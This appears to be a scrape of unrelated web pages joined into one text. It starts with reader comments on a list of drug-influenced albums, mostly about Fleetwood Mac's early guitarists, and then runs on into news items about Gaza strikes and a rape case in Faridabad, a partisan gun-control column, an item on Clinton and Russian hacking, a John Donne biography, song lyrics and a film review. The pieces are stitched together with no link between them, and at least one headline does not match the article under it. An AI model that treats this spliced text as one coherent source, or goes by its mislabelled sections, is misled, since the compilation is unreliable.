While I maybe think that’s his best album [maybe], I don’t really see it as his most fucked up druggy one [even with Between the Bars on it, which is one of the absolute greatest songs about addiction]. He really seemed on top of his game at that point. I honestly would almost say any of his others would be better choices for this list than Either/Or, though that’s just my thinking. His first two SOUND the most drug induced to my ears… and he may have actually been using the most [particularly drinking] during his final two albums- not including posthumous releases. And of course he went completely off the rails at the end… after Figure 8 when he wasn’t making any music at all, not successfully anyway… so that time period wouldn’t bring an album to include.
Interesting choice there though. Glad to see you included Elliott, one of my favorites.)
Anyway, wow I have really started to blather. I’m sorry. Back to your comment, I dislike your attitude toward the Brian Jonestown Massacre as well… though I’m sure you aren’t the only one to feel this way. Ohh well. They seem a good choice for the list though. However, I suppose they kind of always sound drugged up… maybe they don’t really fit after all lol. Idk. They are pretty damn original band in my eyes though. Sure they have their influences like anyone else and certainly there are plenty of 60s bands (and more recent) that have had a very prominent impact on their sound, but there is only one BJM. What they do is distinctly them (or him shall I say.) To say that Anton is simply aping others is short-sighted.
And lastly man… I’m confused. What is so confounding about Fleetwood Mac being included here?? Especially to a degree that warranted a verbal attack of this writer? Saying as Fleetwood Mac was a notorious druggy band, (no… not a “cough drop band” or whatever the hell you said. I mean come on man, you are showing your ignorance with a comment like that. It is wise not to comment on something [especially not insult someone] when you are not informed on the subject.) I’d say it is not surprising to see them on the list. And they probably deserve to be on it too, even if their music isn’t always the trippiest or haziest out there. They surely used enough cocaine by the time Tusk came around that it was having a noticeable effect on their music, and especially their live shows.
Shoot Fleetwood Mac has at least one other period of albums that could have been chosen for this list even! I can’t think of which album(s) in particular off the top of my head would be best to include from their earlier drug addled period, but the original blues incarnation of this band was my personal favorite. As much as I love Stevie Nicks, I much preferred the 3 headed beast on guitars of Peter Green, Danny Kirwan, and Jeremy Spencer. Fuck were they not the most fire blues band in Britain. I think Canned Heat and FM were probably my favorite white-boy blues bands in the late 60s (Cream was too jazzy for me to include in this category. I’m talking some real ass blues.)
Anyway, sometime around the start of the seventies/ end of the sixties, when FM was starting to enjoy some real success, all 3 of their original guitarists were famously dosed with some odd psychedelic at a party in Germany (I think) and either it was way too much or it was some really bad acid or some other relative chemical. All 3 of them were never the same. Basically each became acid casualties from just that one experience, and I highly doubt they were inexperienced trippers.
No one knows what exactly happened that night, but Peter Green’s ego was seemingly obliterated by the trip. He began wearing exotic clothes from Morocco and whatnot, and was in permatrip mode. Started losing interest in playing and no longer wanted any money or royalties. In fact he started giving away all his money, all his possessions. Soon he left the band for good. A few years later he had an episode that involved his generosity. I forget the details exactly, but I believe he pulled a shotgun on somebody (in the band or a manager… I forget who) because he was fed up with people trying to send him checks for all his royalties with the band. I mean this guy was the leader and primary singer/ songwriter, so he no doubt would have had plenty of royalties coming in. He continued to deteriorate after this for many years. I believe he was diagnosed as a paranoid schizophrenic after the acid party.
His apprentice at blues guitar, young Danny Kirwan, was also diagnosed schizo after the party. He stuck with the band a couple years longer and sorta took over the leadership role… as a teenager. It took a few years to really start having an effect on him from what I gather, but when it did it hit him hard. Prolonged effects from the trip and intense stress from the work brought on by becoming the primary songwriter and leader of the band started crushing his fragile soul. Began drinking and using a lot, making his emotions frequently more pronounced. This culminated in him flipping out on his bandmates before a gig, leaving the band, and sitting in the audience for the show… to heckle them. Sadly, this little genius musician soon became a homeless addict and stayed that way for much of the next few decades, until he died not too long ago. Danny made little music the rest of his life.
As for Jeremy Spencer, the band’s slide guitar specialist, sometime before Danny left, but I believe after Peter left, just randomly walked out one day only to immediately become a part of some church. From that moment forward he became devoted to the religious group and no longer played in the band. I don’t believe he has really had any lasting issues from the trip, at least not in the way of schizophrenia or anything. He seemed to actually come out relatively unscathed in the end, living a happy religious life. Times were tough for the first few years or so after that fated evening. He was going through bouts of intense mental instability and fighting a breakdown in the time leading up to his departure from the band. Luckily his newfound faith in god seemed to ease his mental problems.
——And I just now realized that I have actually been typing all of this… all this time. Wow… and so this list gets a drug-addled comment now too hahaha! I sorta have a tendency to get a bit long winded when on uppers… sorry everyone. I hope what I have written is at least SOMEWHAT fascinating to some people, and doesn’t come across as a boring, tedious novel written by a robot… which is what I feel like right now lol. Uggghhh.
Well I guess I just felt like spitting this story out for you all (those of you who don’t already know it anyway.) Fleetwood Mac has one of the more fucked up histories of any band that I’m aware of, and their stories are all quite interesting and the thing of legend by now. Keep in mind that this is only a small part of their history… a lot of other crazy shit has happened to them that I haven’t included. I swear this band is both blessed and cursed. While some of the musicians have spent many years living the life of rich millionaire rock stars, jetting around the globe and insufflating literal fortunes worth of high quality cocaine, staying in 5 star hotels, and getting into fun love triangles/ quadrangles, etc… others have had their lives literally ruined while playing in the band. Some have spent their years without so much as a dime living on the street, and some have died young in freak accident. More than one have lost their mind. Oh and that’s just among the guitarists. Suffice to say if there is one band you want to avoid becoming a guitarist for… it is definitely Fleetwood Mac. The position is all around cursed. I don’t believe there is a single guitarist that has played for them since day one that hasn’t had some awful, life changing event happen to them while in the band. Maybe not Lindsay Buckingham (other than potential heartbreak from some of the in-band affairs, and probably experiencing some kind of drug withdrawal a time or three [Not that I feel too bad for someone coming off coke… really not all that big a deal. That being said, I do feel bad for anyone living through an ADDICTION to cocaine. That is a miserable scene, eventually anyway, and I am sure with the amounts of blow he has gone through over the years, he has probably had some pretty bad times.) But he did just leave the band and drama seems to have ensued from that, so who knows what the future still has in store for these people.
So, the main point to take from all this is one I have yet to really even touch on. The Fleetwood Mac everyone is so familiar with, that everyone loves, is kind of a shitty group of people. Not necessarily all of them, and not all around shitty per se. But while the famous core have spent decades in the limelight and have gained the kind of wealth that few musicians have ever known, some of their former bandmates (in particular Danny Kirwan- who led them forward through their transition years, a time in which they easily could have disbanded, and into the beginnings of their famous Rumours period) have lived on the streets for years with mental problems, and these now wealthy old friends and bandmates have not lent any help to the struggling ones. Mick Fleetwood, John McVie, Christine, McVie, Stevie Nicks, Lindsay Buckingham… none of them helped get Danny off the streets or filled his wallet before he died. I find this disgraceful. It seems they have done very little for any of the others as well, though the situation with Danny has always really bugged me. Any ONE of them could have gotten him into a nice home and supplied him with enough money to live comfortably for a long time… and STILL be wealthy. And that’s just one of them. For real, they could have easily lent some help, but it seems they chose not to. Now I realize I don’t actually know these people personally, and their could be aspects to their relationships I am unaware of. But fuck! Why couldn’t they help this dude get into a better situation?? He payed his dues. He was an integral part of the group and was a major part of their early and mid successes, as small as they may have been. They would have ceased to exist after Peter Green left if it wasn’t for him. And then there would have been no white-collar, jet setting rock n roll to be had a few years later for the least talented part of the old group and the few new bodies added to the lineup, as they went forward making decidedly mediocre music for the masses.
These people profited off the skills and musical genius of Peter Green and Danny Kirwan (and Jeremy Spencer to a lesser degree.) These guys were the real deal and brought the band a lot of respect early on. They have given this band loads of respectability going forward, even after their sound changed. Peter was the fuckin man. The clear leader at heart even to this day of the band. And Danny, sweet Danny, a mere kid with artistic sensibilities and an understanding of music that ran deep. Peter Green saw his talents and took him under his wing, molding his new protégé into a guitar hero. And guitar heroes they both were.
Anyway, I suppose I will shut the fuck up now… Sheeez. Where has my morning gone? The speed won’t let my mind stopppp! Shit!
I’m not trying to talk massive shit on Fleetwood Mac or anything. I just wish more people knew the story about Danny and how no one was there to help him get back on his feet. The little kid who Jimi Hendrix at one time named as one of his favorite guitarists. Who crafted beautiful songs and had a wicked tone. Ahh and his voice! He was left to wither in the gutter with no one there for him. And by god, he is not the only former bandmember of mega bands to spend decades homeless.
They are the forgotten ones. The never knowns. It makes me so sad…
Anyway, check out some stuff from Fleetwood Mac back in the 60s if you are unfamiliar. There are some g00d videos even on youtube. Early 70s is the period where Danny was the primary songwriter/ vocalist, and led them to a softer, beautiful sound with some amazing songs. Not as notable as the 60s incarnation of the band with Peter Green, but also good.
To me, their music went distinctly downhill the moment Danny left. That’s not to say they have made bad music with Stevie and Lindsay. I actually really like Stevie’s voice and her style (and… well shit just about everything else. I love that girl) and his guitar play aint bad, but all in all the music lost something. It became much more formulaic. And nothing beats the big bad blues of 60s Fleetwood Mac. They kicked serious fucking ass. Rocked god damn hard.
Hey once again thanks for making the list, it was a fun read. And to the guy I started out replying to… I hope I didn’t come across as a jerk, I didn’t really mean to call you out too much or anything. Certainly nothing personal. Just wanted to get some things off my mind.
And sorry I turned my reply into this huge wall of text. I feel a fool. Read it/ don’t, I understand completely either way. Hopefully somebody will stumble upon 60s Fleetwood Mac for the first time now after reading this. If so…. fucking enjoy! Same goes to all of you who are already familiar with the music and decide to dip back in for a little refresher. It’s so easy to forget about Peter Green and what they were doing back then. Seems no one ever talks about them…
Anyway, Peace out all

A fun list and a reminder (as Bill Hicks was wont to point out) that drugs have always played a crucial role in the creation of some of the best moments in music history. A minor quibble with the Joy Division (epilepsy and depression?) and Rollins (caffeine?) inclusions. If the list was slightly longer I’d imagine some Chet Baker, Nick Cave representation (Prayers On Fire), Flaming Lips (Hear It Is), MC5 (High Time), and something from the krautrock canon where albums were cut from improvised studio jams fueled by speed and acid (Cosmic Jokers). A fun read and thanks for reminders of so many great albums to go back and re-listen to.

If the criteria are “desperation” and “bleeding chemical influence” as the writer says, some ideas:
Yes (in spades): #48, #43, #33 (should rank higher), #32, #31, #5.
No: #46 (worship the ’Mats, but album makes me happy for some reason) #12 (ok, more folks need to hear Trans, but Tonight’s IS desperation), #9 (too obvious AND its Fleetwood Mac), #6 (seems writer incl. this to brag abt. gng. to 3 Rollins shows. I saw them as a 15yo—their music doesn’t bleed chem influence to me @ ALL).
Missing: The Birthday Party (!!!), Spiritualized, Marianne Faithfull, Broadcast, early Floyd (thx for putting Syd at #1 tho).
Gonna get: Frusciante’s first, McCartney II, #25.
Thank you for this list—and the opp to share my humble opinion(s).

Excellent list. There was is no way to create a “list”, and make it unanimously “correct”, as the pundits encounter with every list ever compiled. I applaud the list and the effort it took to put it together. I could not have done any better, though my additions would be:
Grateful Dead (either of the first two records). The first two records were the definition of drug-riddled, and the band was, by ’68, heavily in to experimentation as a device.
Pink Floyd (Obscured By Clouds, or Ummagumma). I understand why Floyd was ommitted, but I would have opted for inclusion, for obvious reasons.
Monster Magnet (Tab 25, or either of the first two records). Dave Windorf has NEVER shied away from his stance on drugs and in fact has stood proudly at the mantle of his pipe and process. If EVER there was a band/record riddled with drugs, in every way, it is Magnet.
Coltrane (actually, several other jazz greats) could make this list.
I do NOT agree with including G.G. All in, as others have mentioned. While homeboy was one of the poster children for why NOT to do drugs, I don’t believe his music is anywhere near the level of the other musicians and records on this list. It’s super easy to find junkie musicians, but to find junkie musicians who released definitive music is more difficult to do. I don’t think it was about finding the biggest junkie, rather finding the biggest and BEST drug riddled records and artists.

Your research on Bobby Fuller seems to be limited to a novel published several years ago, in which a character with his name appears. At the time of his death, the Manson Family didn’t exist and Bobby himself had little interest in drugs, so it’s hard to see how he made this list. The “acid party” theory regarding Fuller’s death, put forth by his manager Bob Keane, has been proven to be pure speculation by Keane, nothing more.

If you’ve never checked out Linda Perhacs and “Parallelograms”, you have missed out on a true, trippy album, with no rhyme or reason. Definitely a “trip” and worth checking out.

disagree about aerosmith — draw the line sounds way diff. than toys or rocks — guitars are lazier, whiskey soaked, defeated, tyler’s drug inferences and lyrics more sleazy — his voice sounds shot- the record sounds totally uninhibited and flying off the tracks
also tusk is more cocaine riddled then rumours — buckingham’s paranoid fast numbers and songs with only choruses, no verses mixed ,with mcvie’s super slow ballads
As people mentioned, where’s Zep — Physical Graffiti is total opium, the drums, the guitars,and on Presence Page just plays wasted
Sly Stone on There’s a riot — totally wasted, half the words are mumbled and super dark
Ever hear Kate Bush The Red Shoes? Awesome album, sounds like a Marijuana trip
Depeche Mode Black Celebration has a dark drug infested synth sound — Half NightClub, half in a dark room lying on the floor

How you missed “Dirt” by Alice in Chains is beyond me. Then having “Madcap Laughs” at number 1 shows you sort of know what you’re talking about, but have read the wrong books.
Syd was insane and likely would have been insane regardless of the drugs he abused. That’s common knowledge among most PF scholars.
I don’t think I saw Appetite For Destruction either? Sorry, the list has some great albums to listen to, but to leave those two off and have Madcap as #1 is showing some seriously subjective writing.

What about Julian Cope? His album, Fried, is easily one of the most drug-addled and brilliantly eccentric musical endeavors of all time. Cope’s psychedelia-drenched experimentalism is fully evident on the Fried album sleeve which features a naked Cope crouched on top of the Alvecote Mound slag heap clad only in a large turtle shell. Glad to see someone also mentioned Peter Perrett of The Only Ones.

There’s no Alice in Chains’ Dirt? That’s like the most heroin addled record I’ve heard. Korn self titled sounds like a meth binge and comedown. Tools undertow and ænima sounds like 4 guys angry at themselves on acid. I mean look at ænima’s fucking artwork, it’s meant to be viewed on LSD. Filters shortbus is just a straight up drug record. This list really fails. These records on the list don’t have drug influence they just sound like the musicians couldn’t even write music unless on drugs. I’m still pretty appalled that Alice in chains dirt wasn’t on the list.

You have totally omitted the Reggae genre. True, it’s (most of the time) “only” pot Reggae artists are dealing with, but some of them are true junkies. And from time to time you stumble upon the ultimate tropical crackhead, as Jamaica has been a cocaine heaven for 35 years or so now…
For instance, Gregory Isaacs’ “Night Nurse” is not about some woman taking care of Gregory. It is about coke. Gregory Isaacs so didn’t care and was so far gone that he was capable of lighting his crack pipe during meetings at Island Records with Chris Blackwell…
But to get back to ganja, here is a quick selection that serious Reggae fans will no doubt add to
Bob Marley – Kaya
Peter Tosh – Legalize it
Horace Ferguson – Sensi Addict
Mighty Diamonds – Pass the Koutchie
Toots & the Maytals – Pass the Pipe
Sugar Minott -Herbman Hustling
the number of pot-related songs, of Sensi Dub, Kaya Dub, Herb Dub, etc… is simply staggering

After reading your criteria, I guess I can understand omitting Mötley Crüe, although I think the tone and lyrics on the Girls, Girls, Girls album smack o f smack. But to leave Alice in Chains’ “Dirt” off the list is insane. I suggest listening to their early demos, then going back to “Dirt.” The change in sound, let alone the lyrics to half the songs on that album, show the influence of heavy drugs. The fact that it is a GREAT album should earn it a Top 10 nod. (Pun intended)

Ministry´s albums “Filth Pig” & “Dark Side Of The Spoon” should be the top slots!
Al Jourgensen(Ministry) started shooting Cocaine at 13(1971′), was locked up an entire year at a mental institution at 15, after taking Acid and thinking the teachers were insects. Had a Crackpipe built into his Mic-Stand and always a bottle of bushmills Whiskey with 5 hits of Acid in it on stage.
Beating these references/Father Figures is quite hard too:
He lived with Dr.Timothy Leary for two years, paying rent by being his Guinea Pig, trying new sorts of Acid every week. He also lived with and was great friends with William Burroughs. Alien used Crack+Heroin daily for 22years(plus every other drug that came in his way)..
By 2003 he had been:
Legally declared dead three times, had Hep A,B, and C, liver failure, kidney failure, stomach failure(Ulcers), had a big toe and half his foot removed surgically after getting Gang Green by breaking a needle in the toe, forgetting he did it and then walking on it for 5 weeks without noticing(or taking his boots off). Had his entire left arm cut open to get infection away, almost loosing the entire arm.
This guy is the real deal, even Lemmy has stated that “Jourgensen is the heaviest druguser of all musicians”. Read his Biography, it´s as fun as it´s horrifying: “Ministry: The Lost Gospels Of Al Jourgensen”
Like the Ministry song says “Just One Fix”..

pity the lack of Led Zep, Sabbath, YES. pity the lack of hip hop, and much else.
two things i assumed would make the list but didnt:
Bitches Brew has no place here, especially given that Davis’ last 2 albums before retiring for 6 years (Agharta and Pangaea) were recorded the morning and evening of one single very druggy day in Japan in 1975. most saliently, the Japanese release of Pangaea i bought has an extra long version of the final track, Gondwana. that 46 minutes of brain-melting DMT funk is followed by 3.5 extremely druggy minutes of a wasted Miles twiddling knobs by himself in what sounds like Trent Reznor on a Salvia overdose. after hearing THAT, 6 years of recovery and a be-boppy neoconservativish return sounds exactly right.
oh, and the first John Coltrane record i ever heard was “OM” at age 16, and it very much sounds like they are all on acid…i mean seriously, doing exactly the sort of extended, obsessive instrumental experimentation that’s well beyond “Free Jazz” and totally in the realm of what you would expect a bunch of avant-jazz masters to sound like *if they all dropped a whole lot of acid*, let it reach a peak, and then turned the recording equipment on.
according to Nat Hentoff and others, the widely noted jazz industry rumor was precisely that…they were all on a lot of acid. surprised not to see it here.

I’m very late to this party. Came upon the list while trying to remember a Billie Holiday album where she sounds drugged, drunk, or both. It’s not the one in this list, however. As I recall, it was a live concert recording.
Rundgren’s A Wizard, A True Star also came to mind for me. And, regarding the suggestion of Sgt. Pepper’s, maybe the White album would be a better choice.
Anyway, great list…and great job on compiling.

i like the list, or at least the idea of it, but the criteria used remain a bit murky. when it comes to debauchery some more of the old jazz men certainly should’ve been included, as well as oasis (be here now). and like one of the readers i agree that stoner rock (sabbath or one of the later bands like electric wizard) cannot be omitted. i like the fact you included legendary pink dots. maybe in a similar vein bands you wouldnt expect it from should have been added, like the triffids and the g-betweens, and even the kinks. oh, and before we forget nick cave and einsturzende neubauten made some pretty debauched sounds early in their career… still, a nice list!

As for those I don’t, well, I’m that much more inclined to hear them now. Thanks so much for that! (BTW, personally, I think this is a pretty damn great Top 50 list.

The band Mao have a rare album called ‘Graveyard Music’ which was recorded in Aleister Crowley’s house on LSD and weed and it’s probably the most eerie album I’ve heard next to Barrett and the Brian Jonestown Massacre’s music!

Great list, must of got you a lot of time and effort to sort out and choose…the reason that i’m commenting is Alice in chains.Their second lp “dirt” must be one of the most harrowing ,honest,bleak and straightforward accounts of what being a drug addict really is(heroin being the the main d.o.c.).If you also add to that some facts, like that it hit number 1 spot of the billboard top 200 chart the first week of it’s release ,with songs like “junkhead” “godsmack” “sickman” on it, that everyone on the band at the time was on a daily heroin+crack habits(layne staley was actually shooting up dope in the studio in front of the others band members,which actually freaked out their producer cause everyone elses was very cool bout it ) and last but not least the singer layne staley died of a speedball o.d. in 2002.I think “dirt” is the one most sincere ,truthful and close to what it really feels like for someone to be addicted to heroin.

A drugs album list without Todd Rundgren or Utopia cannot be taken seriously – really!
The Neil Young album from 1982 is worth and many forgetting it.

On the Nilsson and Lennon Pussycats album the cover even celebrates the use of drugs whilst making it. Wears it on its sleeve if you will.
On the left is a child’s alphabet block showing the letter D and on the right another block showing the letter S, with a rug between the two.
So if you haven’t got it by now it says D RUG S , and this by a man who once swore Lucy in the Sky With Diamonds only co-incidentaly had the initials LSD. Yeah right John, sure.

Great list but I have to admit I’m surprised by the omission of either John Frusciante’s first two solo records. Both beautifully painful to listen to in their harrowing depiction of heroin’s depravity.

The only entry that really matters is the last one. Syd Barrett’s solo albums can change your entire life; change you as a person. I have had two wives literally beg me to please stop listening to them because it was affecting my mental state to such a degree that they just couldn’t sit by and watch it happen anymore. Syd is the king.

Israeli Forces launch artillery attacks in Gaza
9 Oct, 2017
Shares
RIYADH - Israeli forces have launched artillery attacks on alleged Hamas positions in the Gaza Strip.
No casualties have been reported from the Sunday night attacks.
Israel claims that the attacks were launched is response to rocket fire from the Gaza Strip that landed without causing any injuries.
The Israeli military frequently targets the Gaza Strip, with civilians being the main victims of such attacks.
Israel has launched several wars on the Palestinian coastal sliver, the last of which began in early July 2014. The military aggression, which ended on August 26, 2014, killed nearly 2,200 Palestinians. Over 11,100 others were also wounded in the war.
The Gaza Strip has been under an Israeli siege since June 2007. The blockade has caused a decline in living standards as well as unprecedented unemployment and poverty.

Indian girl abducted, gang raped in moving car in the city
15 Jan, 2018
Shares
NEW DELHI - A 23-year-old Indian girl who was on her way home from work, was allegedly abducted by four men in a Scorpio and gangraped for close to two hours in Faridabad on Saturday evening. The men eventually let her out near Sikri village.
According to police, the incident took place around 7 pm when the woman was walking home. The woman told police that when she was near Sector 9, a Scorpio drew up next to her and the occupants forced her into the vehicle.

Police said the woman’s abductors switched off her phone. “She alleged that there were four men in the car. While three of them took turns raping her, the fourth continued driving around the city,” Sube Singh, PRO of Faridabad Police, said.
They finally released her at a petrol pump near Sikri village — 20 km away from where they abducted her. Meanwhile, police personnel had started setting up checkpoints across the city, having been alerted to the abduction by two people — an eyewitness who saw her being forced into the vehicle and her cousin, with whom she was talking on the phone when she was kidnapped.

“Checkpoints were set up across the city. The woman was finally found at Sikri village, close to where she had been released. The abductors, however, managed to get through our net,” Singh said.
Police had initially registered an FIR at the Old Faridabad police station under IPC Section 365 (kidnapping or abducting) based on a complaint by the woman’s relatives. After she was found, police said the case has been transferred to the women’s police station where additional sections will be added to the FIR.

A Special Investigation Team (SIT) has also been formed to probe the matter. “The SIT, headed by Puja Dabla, ACP (women), has been formed to probe the incident. Three teams, each headed by an inspector, have been deployed to track down the culprits. We expect to nab them soon,” the PRO said.

With the Mueller Investigation Finished, Russiagaters are Scrambling
Imagine there has been a horrible case of child abuse in your neighborhood. A large family with 10 children had parents who brutally beat their kids, and two died. In reacting to that horrendous news, there’s a knock at your door. It’s your mayor and police chief.
“I understand you have two children in this house. Is that correct?” the mayor asks.
“Yes, that’s true. Why?” you reply.
“We’re going to need to see them, to inspect them to make sure they haven’t been subjected to abuse by you,” the chief says.
“Wait, what? You’re not going to inspect my children,” you respond.
“We are going to. And we’re going to monitor your kids from here on out, stopping by periodically to check on them, inspect their bodies for bruises and have them talk to a psychologist to make sure they aren’t being emotionally abused either,” the chief shoots back.
“What the hell gives you the right to do that?” you ask.
“After the horrible abuse that took place a few blocks away, we decided that we had to insert ourselves into the lives of all parents to prevent that from happening ever again,” the mayor says. “So we’ve passed a new law that says we can curtail parental rights for the greater good. Now go get your children.”
No one would accept their parental rights being stripped because a monster abused his, yet this is exactly what liberals seek to do every time there is a high-profile shooting. They want to curtail the rights of law abiding citizens because one evil individual committed a heinous act.

Hell no.
After the Las Vegas massacre, liberals hit their anti-Second Amendment autopilot button and went right into “We-have-to-do-something” mode. Late-night comedians hopped out of their clown car and, one after one, gave the media exactly what it wanted – angry and/or tearful calls for more laws to limit the liberty of individual Americans who did nothing but exist in a way they don’t like.
Kimmel, Colbert, Noah, Meyers and Corden all played their roles perfectly – lecturing their audiences on how something must be done. But what? What could have prevented this massacre?
Nothing. Not one thing.
Colbert summed up exactly the left’s collective sentiments when he said, “Congress can be heroes by doing literally anything.”
But how can you protect against a lone monster from doing something horrible without limiting the rights of everyone? You can’t.
We don’t live in a world like the movie Minority Report where people are punished for crimes they haven’t committed yet. We shouldn’t move any further down the road of punishing people for crimes they’ve never committed.
Yet that’s where the Democrats head every time there is a tragedy. Your rights must be limited because someone else did something unimaginable.
But even if they had their way, it wouldn’t stop what they’re trying to stop. Or at least what they claim they’re trying to stop.
Don’t take my word for it. Here’s what a liberal wrote after studying the issue and hoping to publish a report to influence the debate and advance the gun control agenda. “By the time we published our project, I didn’t believe in many of the interventions I’d heard politicians tout. I was still anti-gun, at least from the point of view of most gun owners, and I don’t want a gun in my home, as I think the risk outweighs the benefits. But I can’t endorse policies whose only selling point is that gun owners hate them.”
That didn’t run in an obscure blog; that ran in the Washington Post.
Even liberals who didn’t lose faith after studying the issue are saying that what Democrats are pushing – and how they’re pushing it – won’t do what they claim they want.
“If we focus on mass shootings as a means of understanding how to reduce the number of people killed by guns in this country, we’re likely to implement laws that don’t do what we want them to do — and miss opportunities to make changes that really work,” wrote the Five Thirty Eight blog.

Deep State: What Was This High-Level Meeting With Intel Officials That Occurred After The 2016 Election?
Matt Vespa
Gun control is not as much about guns as it is about control. Even anti-gun leftists are coming to this conclusion.
So the next time some leftists want to chip away at your rights, know that they are convicting you of a crime you’ll never commit. Know that these people aren’t concerned with safety; they simply don’t like how you exist.
In Venezuela they confiscated guns under the guise of safety. Then, a few years later, their dictator, Nicolás Maduro, handed them out to 400,000 of his supporters. I’m not saying we’re going in the direction of Venezuela. I’m saying we have to fight to make sure this country is never even allowed to look in that direction.
The person responsible for the slaughter in Las Vegas was found dead in that hotel room. It wasn’t the guns that did it; someone that evil would’ve found a way to create carnage. It wasn’t any of the millions of law-abiding gun owners across the country, and it was not the National Rifle Association. No one else should be punished for the actions of the shooter.
Liberals are assaulting the First Amendment’s protections for speech they don’t like. They’re assaulting religious liberty, and they’re aerial bombing the Second Amendment. To preserve these freedoms is going to require a never-ending fight. And that fight starts by telling these clowns trying to chip away further at any of our rights to get back in their car and go to hell.

The New York Times has obtained audio of Hillary Clinton speaking to a group of campaign donors Thursday night, where she finally broke her silence about the supposed Russian hacking of the 2016 election. Instead of taking Kellyanne Conway's advice and putting the controversy to bed to allow for a peaceful transition of power to the Trump White House, she stoked the flames of the allegations.
In her remarks, Clinton said that Vladimir Putin was out to get her because he "blamed" her for the outrage in his own country. There was "no mistake," she said, that Russia intervened in our democratic process to hurt her campaign.
“Make no mistake, as the press is finally catching up to the facts, which we desperately tried to present to them during the last months of the campaign,” Mrs. Clinton told the group, which collectively poured roughly $1 billion into her effort. “This is not just an attack on me and my campaign, although that may have added fuel to it. This is an attack against our country. We are well beyond normal political concerns here. This is about the integrity of our democracy and the security of our nation.”

Wait...Did Pelosi Just Call Ilhan Omar Anti-American?
Matt Vespa
President Obama is of the same mind. He pledged to retaliate against Russia, either online or in the form of sanctions.
President-elect Donald Trump and his surrogates are not so convinced that they have Russia to thank for his win. After all, it's not Russia's fault that Clinton "ignored" states like Michigan during the campaign, Conway said on Fox News Friday morning.

John Donne
John Donne (/ˈdʌn/ DUN) (22 January 1572 – 31 March 1631) was an English poet and a cleric in the Church of England. He is considered the pre-eminent representative of the metaphysical poets. His works are noted for their strong, sensual style and include sonnets, love poems, religious poems, Latin translations, epigrams, elegies, songs, satires and sermons. His poetry is noted for its vibrancy of language and inventiveness of metaphor, especially compared to that of his contemporaries. Donne's style is characterised by abrupt openings and various paradoxes, ironies and dislocations. These features, along with his frequent dramatic or everyday speech rhythms, his tense syntax and his tough eloquence, were both a reaction against the smoothness of conventional Elizabethan poetry and an adaptation into English of European baroque and mannerist techniques.

Famous quotes by John Donne:
"One short sleep past, we wake eternally, / And death shall be no more; death, thou shalt die."
"Love's mysteries in souls do grow, But yet the body is his book"
"Keep us, Lord, so awake in the duties of our callings that we may sleep in Thy peace and wake in Thy glory"
"All mankind is of one author, and is one volume; when one man dies, one chapter is not torn out of the book, but translated into a better language; and every chapter must be so translated...As therefore the bell that rings to a sermon, calls not upon the preacher only, but upon the congregation to come: so this bell calls us all: but how much more me, who am brought so near the door by this sickness....No man is an island, entire of itself...any man's death diminishes me, because I am involved in mankind; and therefore never send to know for whom the bell tolls; it tolls for thee."
"Be thine own palace, or the world's thy jail"
"Love built on beauty, soon as beauty, dies."
"Reason is our soul's left hand, Faith her right."
"Any man's death diminishes me, because I am involved in Mankind; And therefore never send to know for whom the bell tolls; it tolls for thee."
"Poetry is a counterfeit creation, and makes things that are not, as though they were"
"No spring nor summer beauty hath such grace as I have seen in one autumnal face."
"No man is an island, entire of itself; every man is a piece of the continent."
John Donne

Before Your Eyes
Yesterday you thought the flame has flickered again
A feeling from the past you’d recognize
But maybe tomorrow morning I won’t be there
Cos if you’re looking for the answer, then it’s
Right before your eyes
Look into the mirror, who is it you see?
The face of someone now as cold as ice
The anger in your mind turns now toward regret
If you’re looking for the answer
Then it’s right before your eyes
When your bed is empty
And you’re thinking of me
Your mind will dwell on all your sacrifice
For surely tomorrow morning, I won’t be there
And if you’re looking for the answer, then it’s
John Donne
John Donne (/ˈdʌn/ DUN) (22 January 1572 – 31 March 1631) was an English poet and a cleric in the Church of England. He is considered the pre-eminent representative of the metaphysical poets. His works are noted for their strong, sensual style and include sonnets, love poems, religious poems, Latin translations, epigrams, elegies, songs, satires and sermons. His poetry is noted for its vibrancy of language and inventiveness of metaphor, especially compared to that of his contemporaries. Donne's style is characterised by abrupt openings and various paradoxes, ironies and dislocations. These features, along with his frequent dramatic or everyday speech rhythms, his tense syntax and his tough eloquence, were both a reaction against the smoothness of conventional Elizabethan poetry and an adaptation into English of European baroque and mannerist techniques. His early career was marked by poetry that bore immense knowledge of English society and he met that knowledge with sharp criticism. Another important theme in Donne's poetry is the idea of true religion, something that he spent much time considering and about which he often theorized. He wrote secular poems as well as erotic and love poems. He is particularly famous for his mastery of metaphysical conceits.

73 Sports Movies In 73 Days: ‘Summer Catch’

I don’t watch movies to make friends. I watch them to either enjoy them or take to the Internet to rip the ever-loving stuffing out of them, as is my constitutional right that the forefathers once gifted to me in a peyote-induced dream. And one movie that I have long loathed with every fiber of my being is the 2001 baseball movie Summer Catch, which starred Freddie Prinze Jr. and Matthew Lillard as two guys who had possibly seen people play baseball at one time in their lives.
Obviously, it’s not fair to open this by saying that I hate a movie, or in this case believe that Summer Catch was a terrible waste of the napkin that the script was written on, but part of this 73 Sports Movies in 73 Days experiment is to re-live films that I have previously either loved or hated and see if my mind has changed.

On Friday, I watched the horse racing comedy Hot to Trot for the first time since I was a kid, and I picked it because I had memories of thinking it was incredibly funny despite its terrible premise, writing and acting. What I learned is that my memory was wrong and it is not a movie that adult Burnsy shares fondly with child Burnsy. So was Summer Catch, which I watched this morning, a movie that could change my mind?
HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA, no.
This is “acting”:
This is “pitching”:
This is also someone who was paid to “act”:
So let’s skip all of the breakdowns and take this movie at face value and admit together what this actually was – a reason to show Jessica Biel in a bikini.
Oh, and also Jessica Biel in a wet t-shirt.
Basically, director Michael Tollin thought, “Hey, let’s get Jessica to wear as little clothing as possible and then sit back and collect the money and fame.” And I respect that thought process, I really do. But don’t sully the name of baseball movies by offering me a delicious taco and then filling it with soggy cardboard. At the very least, cast people who know how to play baseball.
Summer Catch Fun Facts:
Director Michael Tollin made his feature film debut with Summer Catch, after cutting his teeth with a Hank Aaron documentary and an episode of Arli$$, among several other things you’ve never heard of. He would only direct Radio after that, before going on to become the executive producer of Smallville, One Tree Hill and three 30 for 30 episodes.
Writer Kevin Smalls made a name for himself as a sports fiction writer with episodes of Sports Night and Arli$$, but Summer Catch is the only feature film he has ever written. His current gig? Writer for Franklin & Bash.
As for Freddie Prinze Jr., well we all know what he’s up to these days…

Kevin Durant Ankle Injury: Latest on Warriors Forward vs. Rockets
On: March 14, 2019
In: Sport
Tagged: sport
